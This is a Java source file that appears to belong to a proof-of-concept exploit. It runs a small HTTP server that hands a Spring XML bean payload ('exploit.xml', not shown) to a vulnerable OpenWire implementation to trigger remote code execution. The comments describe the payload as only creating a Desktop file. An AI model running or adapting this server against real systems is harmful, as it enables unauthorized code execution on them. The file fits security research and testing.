package http;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Collectors;

/**
 * This is an HTTP server which returns the content of the Spring XML Bean needed to cause remote code execution in
 * the vulnerable implementation of Open Wire.
 * The XML used here just creates a file in the Desktop folder with a content.
 */
public class HttpServer {

    /**
     * Timeout to wait for incoming connections.
     */
    private static final Integer CONNECTION_TIMEOUT_MILLIS = 5000;

    private ServerSocket serverSocket;

    private String xmlFilePayload;

    private AtomicBoolean isRunning = new AtomicBoolean(true);

    public static void main(String[] args) throws IOException {
        HttpServer server = new HttpServer(8888);
        server.run();
    }

    public HttpServer(int port) throws IOException {
        serverSocket = new ServerSocket(port);
        serverSocket.setSoTimeout(CONNECTION_TIMEOUT_MILLIS);
        xmlFilePayload = readXmlFile("exploit.xml");
        System.out.println("Server listening on port " + port);
    }

    public void run() {
        while (isRunning.get()) {
            try {
                Socket clientSocket = serverSocket.accept();
                handleRequest(clientSocket);
            } catch (IOException e) {
                // This would happen every 5 seconds for each incoming connection not processed until the
                // isRunning flag is set to false
                System.out.println("Error when accepting incoming connection: " + e.getMessage());
            }
        }
        try {
            serverSocket.close();
        } catch (IOException e) {
            System.out.println("Error when closing socket: " + e.getMessage());
        }
    }

    private void handleRequest(Socket clientSocket) {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
             BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(clientSocket.getOutputStream()))) {

            // Read the HTTP request headers
            String requestLine = reader.readLine();
            System.out.println("Received a request with the first header: " + requestLine);

            // Send HTTP response with XML file
            writer.write("HTTP/1.1 200 OK\r\n");
            writer.write("Content-Type: application/xml\r\n");
            writer.write("\r\n"); // End of headers

            // Read the content of the XML file and send it in the response
            writer.write(xmlFilePayload);
            writer.flush();
        } catch (IOException e) {
            System.out.println("Error handling client: " + e.getMessage());
        }
    }

    public void stopRunning() {
        this.isRunning.set(false);
    }

    private static String readXmlFile(String fileName) throws IOException {
        // Read the content of the XML file from the classpath
        Path filePath = Paths.get("src", "main", "resources", fileName);
        return Files.lines(filePath, StandardCharsets.UTF_8).collect(Collectors.joining("\n"));
    }
}
